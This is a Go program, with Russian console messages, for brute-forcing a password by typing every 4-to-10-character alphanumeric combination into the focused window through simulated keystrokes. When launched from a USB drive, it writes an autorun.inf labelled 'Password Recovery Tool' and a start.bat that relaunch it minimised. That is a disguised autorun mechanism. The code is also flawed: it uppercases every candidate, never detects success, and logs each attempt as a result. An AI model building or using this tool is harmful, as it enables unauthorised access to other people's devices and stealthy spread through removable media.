package main

import (
	"bufio"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"
	"unicode"

	"github.com/go-vgo/robotgo"
)

const (
	stateFile    = "bruteforce_state.txt"
	resultsFile  = "bruteforce_results.txt"
	alphabet     = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	minLength    = 4
	maxLength    = 10
	delayBetween = 300
)

type ProgressState struct {
	CurrentLength int
	CurrentCombo  string
}

func setupAutorun() {
	autorunContent := `[AutoRun]
open=start.bat
action=Password Recovery Tool
label=USB Utilities
`
	batContent := `@echo off
start /min ` + filepath.Base(os.Args[0]) + `
exit
`

	if _, err := os.Stat("autorun.inf"); os.IsNotExist(err) {
		os.WriteFile("autorun.inf", []byte(autorunContent), 0644)
	}

	if _, err := os.Stat("start.bat"); os.IsNotExist(err) {
		os.WriteFile("start.bat", []byte(batContent), 0644)
	}
}

func isRunningFromUSB() bool {
	exePath, _ := os.Executable()
	for _, drive := range []string{"D:", "E:", "F:", "G:"} {
		if strings.HasPrefix(strings.ToUpper(exePath), drive) {
			return true
		}
	}
	return false
}

func SaveState(length int, combo string) error {
	file, err := os.Create(stateFile)
	if err != nil {
		return err
	}
	defer file.Close()

	_, err = fmt.Fprintf(file, "%d\n%s", length, combo)
	return err
}

func LoadState() (ProgressState, error) {
	state := ProgressState{CurrentLength: minLength}

	if _, err := os.Stat(stateFile); os.IsNotExist(err) {
		return state, nil
	}

	file, err := os.Open(stateFile)
	if err != nil {
		return state, err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	if scanner.Scan() {
		state.CurrentLength, _ = strconv.Atoi(scanner.Text())
	}
	if scanner.Scan() {
		state.CurrentCombo = scanner.Text()
	}

	return state, nil
}

func SaveResult(password string) {
	file, err := os.OpenFile(resultsFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer file.Close()

	fmt.Fprintf(file, "%s\n", password)
}

func SendKeys(keys string) {
	upperKeys := ""
	for _, r := range keys {
		upperKeys += string(unicode.ToUpper(r))
	}

	robotgo.TypeStr(upperKeys)
	robotgo.KeyTap("enter")
	time.Sleep(time.Millisecond * delayBetween)
}

func BruteForce(alphabet string, buffer []rune, pos, length int, startFrom string) bool {
	if pos == length {
		password := string(buffer[:length])
		fmt.Printf("Пробуем: %s\n", password)
		SaveResult(password)
		SendKeys(password)
		return false
	}

	if pos < len(startFrom) {
		buffer[pos] = rune(startFrom[pos])
		if BruteForce(alphabet, buffer, pos+1, length, startFrom) {
			return true
		}
		return false
	}

	for _, char := range alphabet {
		buffer[pos] = char
		if BruteForce(alphabet, buffer, pos+1, length, startFrom) {
			return true
		}
	}
	return false
}

func main() {
	if isRunningFromUSB() {
		setupAutorun()
		exec.Command("cmd", "/C", "start", "/min", filepath.Base(os.Args[0])).Run()
		os.Exit(0)
	}

	fmt.Println("Brute Force Password Cracker")
	fmt.Println("--------------------------")

	state, err := LoadState()
	if err != nil {
		fmt.Printf("Ошибка загрузки состояния: %v\n", err)
		return
	}

	var choice string
	if state.CurrentCombo != "" {
		fmt.Printf("Найдено сохраненное состояние: длина %d, комбинация '%s'\n", state.CurrentLength, state.CurrentCombo)
		fmt.Print("Хотите продолжить (c) или начать заново (n)? [c/n]: ")
		fmt.Scanln(&choice)
	}

	buffer := make([]rune, maxLength)

	for length := state.CurrentLength; length <= maxLength; length++ {
		fmt.Printf("\n[+] Перебор паролей длины %d...\n", length)

		startFrom := ""
		if strings.ToLower(choice) != "n" && length == state.CurrentLength {
			startFrom = state.CurrentCombo
		}

		BruteForce(alphabet, buffer, 0, length, startFrom)

		state.CurrentCombo = ""
		SaveState(length+1, "")
	}

	fmt.Println("\n[!] Все комбинации перебраны. Пароль не найден.")
}
